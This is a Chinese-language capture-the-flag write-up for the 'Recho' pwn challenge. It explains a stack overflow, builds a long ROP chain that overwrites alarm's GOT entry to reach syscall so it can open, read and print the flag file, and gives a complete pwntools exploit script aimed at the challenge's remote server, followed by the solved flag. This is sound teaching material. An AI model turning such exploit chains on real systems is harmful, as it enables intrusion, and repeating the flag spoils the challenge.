# Recho

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=af3cf98d-47ff-4645-8829-808fc76b57cc_2)

这题没做出来。虽然本质上还是rop，但是我已经被绕晕了，这是我萌新阶段见过最长的rop链。

程序就跟它的名字一样，会重新打印输入的内容。第一次输入是要输入的字符串的长度，第二次输入是要打印的字符串。checksec看看。

-   Arch:     amd64-64-little
    <br>RELRO:    Partial RELRO
    <br>Stack:    No canary found
    <br>NX:       NX enabled
    <br>PIE:      No PIE (0x400000)

保护还行，难度不高。反编译main函数看看。

```c
undefined8 main(void)
{
  ssize_t sVar1;
  char local_48 [16];
  undefined local_38 [40];
  int local_10;
  int local_c;
  Init();
  write(1,"Welcome to Recho server!\n",0x19);
  while( true ) {
    sVar1 = read(0,local_48,16);
    if (sVar1 < 1) break;
    local_c = atoi(local_48);
    if (local_c < 16) {
      local_c = 16;
    }
    sVar1 = read(0,local_38,(long)local_c);
    local_10 = (int)sVar1;
    local_38[local_10] = 0;
    printf("%s",local_38);
  }
  return 0;
}
```

Init函数内部如下。

```c
void Init(void)
{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  alarm(0x3c);
  return;
}
```

不仔细看还以为就是个普通的栈溢出。但是定睛一看发现，栈溢出位于一个while死循环，想让这个函数返回并开始执行构造的rop链只能ctrl+c。好消息是这样确实能执行一次rop链，坏消息是只有一次，程序直接被终止了，不可能再有漏洞的二次利用了。

所以我们需要一次到位。拿shell就不用想了，泄露地址+调用system怎么都要两次。之前拿shell拿得太快乐了，都忘了我们的目标是flag而不是shell。想个办法读取出flag就够了。于是我们就踏上了超长rop链的不归路。

c语言里使用open来打开文件。在linux中，write、read、open、close、alarm等都是由系统调用的，算是一个知识点，不过看程序汇编也可以知道。在不知道这些函数的地址的情况下，可以将rax里放上要调用函数的系统调用号，然后调用syscall，参数的传递和其他函数一样。结果等同于调用函数的plt。open的系统调用号可以查到，为2。

说了这么多，我们该怎么调用open呢？换个问法，我们该怎么调用syscall呢？

- => 0x00007f2ccea3a5b0 <+0>:     endbr64 
   <br>0x00007f2ccea3a5b4 <+4>:     mov    $0x25,%eax
   <br>0x00007f2ccea3a5b9 <+9>:     syscall 
   <br>0x00007f2ccea3a5bb <+11>:    cmp    $0xfffffffffffff001,%rax
   <br>0x00007f2ccea3a5c1 <+17>:    jae    0x7f2ccea3a5c4 <alarm+20>
   <br>0x00007f2ccea3a5c3 <+19>:    ret    
   0x00007f2ccea3a5c4 <+20>:    mov    0x12e845(%rip),%rcx        # 0x7f2cceb68e10
   <br>0x00007f2ccea3a5cb <+27>:    neg    %eax
   <br>0x00007f2ccea3a5cd <+29>:    mov    %eax,%fs:(%rcx)
   <br>0x00007f2ccea3a5d0 <+32>:    or     $0xffffffffffffffff,%rax
   <br>0x00007f2ccea3a5d4 <+36>:    ret 

在alarm函数那里设个断点，gdb中可以看见调用alarm地址偏移5的地方使用了syscall（endbr64不算，这是一种特殊的保护机制，具体可以上网查。所以alarm从0x00007f2ccea3a5b4 <+4>开始，syscall的偏移就是9-4=5）。如果我们可以把alarm的调用地址加上五，那么再次调用alarm的时候实际调用的就是syscall了。这种方法就是got表改写。

找一下有没有关于add的gadget？

- ROPgadget --binary ctf --only 'add|ret'
  > 0x000000000040070d : add byte ptr [rdi], al ; ret 

这个不错，把rdi内存储的内容加上al里存储的内容。如果rdi里是alarm的got表里的地址，al是5，got表地址改写就成功了。插一嘴，got表可以改写的前提是RELRO防护为Partial RELRO。al是rax的一部分，pop rax相当于将值传到al里。

- ROPgadget --binary ctf --only 'pop|ret' | grep 'rax'
  > 0x00000000004006fc : pop rax ; ret

第一步改写就准备得差不多了。目前rop链如下。

```python
payload=b'a'*0x38
payload+=p64(prax)+p64(0x5)
payload+=p64(prdi)+p64(alarm_got)
payload+=p64(padd)
```

- ### open
  > 打开一个文件
  - 原型：int open(char *path,int access[,int auth]);
  - 参数
    > char *path 要打开的包含路径的文件名<br>
    > int access  为打开方式<br>
    > int auth   为访问权限

改完了就该用了。open函数的第一个参数是要打开的文件的路径名，估计在当前路径下所以直接传flag就好。程序里正好为我们准备了flag字符串。

-  ROPgadget --binary ctf --string 'flag'  
  > 0x0000000000601058 : flag

应该是出题人的提示。rop链继续增长。

```python
payload+=p64(prax)+p64(0x2)
payload+=p64(prdi)+p64(flag)
payload+=p64(prdx)+p64(0)
payload+=p64(prsi)+p64(0)+p64(0)
payload+=p64(alarm)
```

64位中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。rsi传入的0表示以只读方式打开文件，我不是很理解的是为啥要两个0。open的第三个参数在只读文件时是可选的，所以不传也行，传个0似乎也没啥影响。alarm此时已经被改为syscall，所以调用alarm就是调用syscall。

接下来读取打开的文件流，用read。read的plt地址可以查到，就不用系统调用了。read参数情况：read(fd,stdin_buffer,100),对照着上面的64位传参一个个压进去就行了。fd 的值一般是 3 开始(0,1,2好像是被系统保留了），依次增加。比如我 open 了两个文件，那么它们的 fd 分别为 3 和 4。写入的buffer区要找可读可写的，第一考虑bss段。ghidra里直接搜stdin就可以找到一段0x00601070。rop链还没有要停的意思。

```python
payload+=p64(prdi)+p64(3)      
payload+=p64(prsi)+p64(bss+0x500)+p64(0)
payload+=p64(prdx)+p64(100)
payload+=p64(readplt)
```

这边的rsi同样多压了个0。我实在不太懂栈，难道压rsi必须要这样吗？之前习惯调用puts，只用rdi，完全没考虑过rsi。这payload不是完全我的，自己改编并改了一些值试了一下，发现bss段必须加上0x500才能出flag。也不知道为啥，玄学吗？

bss段已经有了flag了。printf打印出来就能知道flag了。

```python
payload+=p64(prdi)+p64(bss+0x500)
payload+=p64(printf)
```

最终exp如下。

```python
from pwn import *
p=remote('61.147.171.105',52380)
prdi=0x4008a3
prsi=0x4008a1
prdx=0x4006fe
prax=0x4006fc
padd=0x40070d
alarm=4195824
readplt=4195840
printf=4195808
alarm_got=6295592
flag=0x601058
bss=0x601070
payload=b'a'*0x38
payload+=p64(prax)+p64(0x5)
payload+=p64(prdi)+p64(alarm_got)
payload+=p64(padd)
payload+=p64(prax)+p64(0x2)
payload+=p64(prdi)+p64(flag)
payload+=p64(prdx)+p64(0)
payload+=p64(prsi)+p64(0)+p64(0)
payload+=p64(alarm)
payload+=p64(prdi)+p64(3)      
payload+=p64(prsi)+p64(bss+0x500)+p64(0)
payload+=p64(prdx)+p64(100)
payload+=p64(readplt)
payload+=p64(prdi)+p64(bss+0x500)
payload+=p64(printf)
p.recvuntil('Welcome to Recho server!\n')
p.sendline(str(0x200))
payload=payload.ljust(0x200,b'\x00')
p.send(payload)
p.recv()
p.shutdown('write')
p.interactive()
```

0x200大小是为了保证远程机接收完全部的payload，可能会因为有缓存的问题导致覆盖不完整。一定要先recv一下，否则也出不了flag。shutdown实测write或者send都行。

- ### Flag
  > cyberpeace{cad64e96528da20d7f3f9644e2aa695f}